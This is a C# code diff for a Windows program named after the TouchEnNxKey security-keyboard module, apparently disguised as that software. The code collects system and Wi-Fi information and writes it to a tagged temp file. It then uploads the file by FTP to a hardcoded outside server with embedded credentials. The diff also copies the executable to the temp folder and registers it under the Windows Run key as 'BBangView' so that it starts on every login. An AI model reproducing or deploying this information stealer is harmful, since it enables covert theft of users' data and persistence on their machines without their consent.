@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -28,11 +29,20 @@ namespace TouchEnNxKey
         [STAThread]
         static void Main()
         {
-            //MessageBox.Show("Win32Evrt.dll 파일을 찾을 수 없습니다.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            //정보 가져오기
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
+        }
 
-            Tag = ReadTag(System.Reflection.Assembly.GetEntryAssembly().Location);
+        public static void GetAllInformations()
+        {
+            string ExeFileName = System.Reflection.Assembly.GetEntryAssembly().Location;
+            Tag = ReadTag(ExeFileName);
+            consistance(ExeFileName);
+            RegisterAutostart(ExeFileName);
 
-            
+
             StringBuilder sb = new StringBuilder();
             sb.Append(sep);
             sb.Append(getWifiInfo());
@@ -47,7 +57,7 @@ namespace TouchEnNxKey
 
             String timeStamp = GetTimestamp(DateTime.Now);
             string localPath = Path.GetTempPath();
-            string fileName = Tag + "_" + timeStamp +".txt";
+            string fileName = Tag + "_" + timeStamp + ".txt";
 
             //text 인자를 파일로 생성
             using (StreamWriter output = new StreamWriter(localPath + fileName, false, System.Text.Encoding.UTF8))
@@ -56,13 +66,10 @@ namespace TouchEnNxKey
             }
 
             FtpUpload("ftp://ghostyak83.cafe24.com", "test1", "test1", localPath + fileName, fileName);
-            
-            //정보 가져오기
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new Form1());
-        }
 
+
+            
+        }
 
         public static String GetTimestamp(DateTime value)
         {
@@ -254,10 +261,46 @@ namespace TouchEnNxKey
             {
 
             }
-            
-            
 
             return tag.Replace(Magic, "");
+        }
+
+        static void consistance(string fullpath)
+        {
+            string tempPath = Path.GetTempPath();
+            string newFileName = Path.GetFileName(fullpath);
+            try
+            {
+                File.Copy(fullpath, tempPath + newFileName, true);
+            }
+            catch(Exception)
+            {
+
+            }
+        }
+
+        static void RegisterAutostart(string fullpath)
+        {
+            string tempPath = Path.GetTempPath();
+            string newFileName = Path.GetFileName(fullpath);
+            string _FULLPATH = tempPath + newFileName;
+            string _NAME = "BBangView";
+            try
+            {
+                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                object valueObject = null;
+
+                //레지스트리 등록
+                valueObject = registryKey.GetValue(_NAME);
+                if (valueObject == null)
+                {
+                    registryKey.SetValue(_NAME, _FULLPATH);
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
         }
 
     }
